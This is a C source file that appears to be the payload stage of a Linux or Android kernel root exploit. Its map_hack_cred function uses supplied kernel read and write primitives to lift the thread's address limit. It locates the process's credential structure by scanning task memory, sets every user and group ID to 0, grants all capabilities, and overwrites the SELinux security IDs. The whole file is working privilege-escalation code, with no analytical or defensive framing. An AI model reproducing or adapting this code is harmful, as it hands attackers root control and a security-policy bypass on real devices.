#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include "hack_data.h"
#include "crusty.h"

void *g_thread_info = NULL;
void *g_thread_task = NULL;
void *g_task_cred = NULL;
void *g_task_comm = 0;
int g_cred_offset = 0;

static inline bool
is_cpu_timer_valid(struct list_head *cpu_timer)
{
  if (cpu_timer->next != cpu_timer->prev) {
    return false;
  }

  if ((unsigned long int)cpu_timer->next < KERNEL_START) {
    return false;
  }

  return true;
}

int inline in_strncmp(const char *s1, const char *s2, size_t n)
{
    for ( ; n > 0; s1++, s2++, --n) 
    {
        if (*s1 != *s2)
        {
            return ((*(unsigned char *)s1 < *(unsigned char *)s2) ? -1 : +1);
        }
        else if (*s1 == '\0')
        {
            return 0;
        }
    }
    return 0;
}

#define UPDATE_STRUCT_ELEMENT(dest, el, src)  \
    write_kernel_memory((unsigned long int)&(dest)->el, &(src)->el, sizeof((src)->el));

bool
map_hack_cred(ssize_t (*read_kernel_memory)(unsigned long int address, void *values, size_t length),
    ssize_t (*write_kernel_memory)(unsigned long int address, const void *values, size_t length),
    void *thread_info)
{
  struct cred *cred;
  struct task_security_struct *security;
  int i;
  char name[] = {'m', 'i', 's', 't', 'l', 'e'};
  struct thread_info info_buf;
  unsigned char task_buf[0x400+0x100];
  struct cred cred_buf;
  struct task_security_struct sec_buf;
  ssize_t nr;
  
  printf("[%s]enter.\n", __FUNCTION__);
  nr = read_kernel_memory((unsigned long int)thread_info, &info_buf, sizeof(info_buf));
  if(nr < sizeof(info_buf)) {
    printf("[%s]line: %d. read_kernel_memory failed.\n", __FUNCTION__, __LINE__);
    return false;
  }
  if(info_buf.addr_limit != -1)
  {
      info_buf.addr_limit = -1;
      UPDATE_STRUCT_ELEMENT((struct thread_info *)thread_info, addr_limit, &info_buf);
  }

  g_thread_info = thread_info;
  g_thread_task = info_buf.task;
  
  nr = read_kernel_memory((unsigned long int)info_buf.task, &task_buf, sizeof(task_buf));
  if(nr < sizeof(task_buf)) {
    printf("[%s]line: %d. read_kernel_memory failed.\n", __FUNCTION__, __LINE__);
    return false;
  }
  
  cred = NULL;
  for (i = 0; i < 0x400; i+= 4) {
    struct task_struct_partial *task = (void *)((unsigned long)task_buf + i);

    if (is_cpu_timer_valid(&task->cpu_timers[0])
     && is_cpu_timer_valid(&task->cpu_timers[1])
     && is_cpu_timer_valid(&task->cpu_timers[2])
     && (unsigned long)task->cred >= 0xC0000000
     && task->real_cred == task->cred) {
      cred = task->cred;
      g_cred_offset = i;
      g_task_cred = cred;
      break;
    }

    if(0 == in_strncmp(task->comm, name, 8)) {
      cred = task->cred;
      g_cred_offset = i;
      g_task_cred = cred;
      g_task_comm = task->comm;
      break;
    }
  }
    
  if (cred == NULL) {
      printf("[%s]line: %d. read_kernel_memory failed.\n", __FUNCTION__, __LINE__);
    return false;
  }
  
  nr = read_kernel_memory((unsigned long int)cred, &cred_buf, sizeof(cred_buf));
  if(nr < sizeof(cred_buf)) {
    printf("[%s]line: %d. read_kernel_memory failed.\n", __FUNCTION__, __LINE__);
    return false;
  }
  
  cred_buf.uid = 0;
  cred_buf.gid = 0;
  cred_buf.suid = 0;
  cred_buf.sgid = 0;
  cred_buf.euid = 0;
  cred_buf.egid = 0;
  cred_buf.fsuid = 0;
  cred_buf.fsgid = 0;
  
  UPDATE_STRUCT_ELEMENT(cred, uid, &cred_buf);
  UPDATE_STRUCT_ELEMENT(cred, gid, &cred_buf);
  UPDATE_STRUCT_ELEMENT(cred, suid, &cred_buf);
  UPDATE_STRUCT_ELEMENT(cred, sgid, &cred_buf);
  UPDATE_STRUCT_ELEMENT(cred, euid, &cred_buf);
  UPDATE_STRUCT_ELEMENT(cred, egid, &cred_buf);
  UPDATE_STRUCT_ELEMENT(cred, fsuid, &cred_buf);
  UPDATE_STRUCT_ELEMENT(cred, fsgid, &cred_buf);

  cred_buf.cap_inheritable.cap[0] = 0xffffffff;
  cred_buf.cap_inheritable.cap[1] = 0xffffffff;
  cred_buf.cap_permitted.cap[0] = 0xffffffff;
  cred_buf.cap_permitted.cap[1] = 0xffffffff;
  cred_buf.cap_effective.cap[0] = 0xffffffff;
  cred_buf.cap_effective.cap[1] = 0xffffffff;
  cred_buf.cap_bset.cap[0] = 0xffffffff;
  cred_buf.cap_bset.cap[1] = 0xffffffff;
  
  UPDATE_STRUCT_ELEMENT(cred, cap_inheritable, &cred_buf);
  UPDATE_STRUCT_ELEMENT(cred, cap_permitted, &cred_buf);
  UPDATE_STRUCT_ELEMENT(cred, cap_effective, &cred_buf);
  UPDATE_STRUCT_ELEMENT(cred, cap_bset, &cred_buf);

  security = cred_buf.security;
    
  nr = read_kernel_memory((unsigned long int)security, &sec_buf, sizeof(sec_buf));
  if(nr < sizeof(sec_buf)) {
    printf("[%s]line: %d. read_kernel_memory failed.\n", __FUNCTION__, __LINE__);
    return false;
  }
  if (security) {
    if (sec_buf.osid != 0
     && sec_buf.sid != 0
     && sec_buf.exec_sid == 0
     && sec_buf.create_sid == 0
     && sec_buf.keycreate_sid == 0
     && sec_buf.sockcreate_sid == 0) {
      sec_buf.osid = 1;
      sec_buf.sid = 1;
      
        UPDATE_STRUCT_ELEMENT(security, osid, &sec_buf);
        UPDATE_STRUCT_ELEMENT(security, sid, &sec_buf);      
    }
  }
  
  return true;
}
